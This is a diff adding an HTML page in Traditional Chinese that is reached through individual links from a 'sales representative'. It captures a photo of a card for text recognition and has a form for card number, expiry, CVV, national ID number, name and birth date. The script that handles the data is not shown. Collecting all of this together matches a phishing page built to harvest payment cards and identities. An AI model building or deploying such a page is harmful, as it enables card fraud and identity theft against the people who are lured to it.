@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>資料送出</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div id="view-loading">載入中...</div>
+  <div id="view-invalid" hidden>此連結已失效，請聯繫業務人員。</div>
+  <div id="view-capture" hidden>
+    <video id="camera-preview" autoplay playsinline></video>
+    <button id="btn-capture">拍照</button>
+    <label id="btn-upload">選擇圖片<input type="file" accept="image/*" hidden></label>
+  </div>
+  <div id="view-confirm" hidden>
+    <form id="form-confirm">
+      <input type="text" name="card_number" placeholder="卡號" maxlength="19" required>
+      <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
+      <input type="password" name="cvv" placeholder="背面末三碼" maxlength="4" required autocomplete="off">
+      <input type="text" name="id_number" placeholder="身分證字號" maxlength="10" required>
+      <input type="text" name="name" placeholder="姓名" required>
+      <input type="date" name="birth_date" required>
+      <button type="submit">送出</button>
+    </form>
+  </div>
+  <div id="view-done" hidden>資料已送出。</div>
+  <div id="view-error" hidden></div>
+  <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+  <script type="module" src="app.js"></script>
+</body>
+</html>
